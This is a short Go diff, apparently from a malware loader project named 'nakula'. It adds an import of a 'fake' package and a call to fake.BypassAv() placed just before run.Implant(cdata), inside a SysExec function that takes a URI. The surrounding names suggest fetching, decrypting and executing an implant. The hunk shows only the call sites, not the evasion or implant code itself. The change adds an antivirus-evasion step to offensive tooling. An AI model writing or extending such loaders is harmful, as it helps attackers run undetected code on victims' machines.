@@ -5,6 +5,7 @@ import (
 	"encoding/hex"
 	aes "nakula/aes-dec"
 	run "nakula/exec-syscall"
+	fake "nakula/fake"
 	inCon "nakula/inet"
 	"os"
 	"time"
@@ -51,6 +52,7 @@ func SysExec(URI string) {
 		time.Sleep(10 * time.Second)
 		os.Exit(1)
 	}
+	fake.BypassAv()
 	run.Implant(cdata)
 
 }
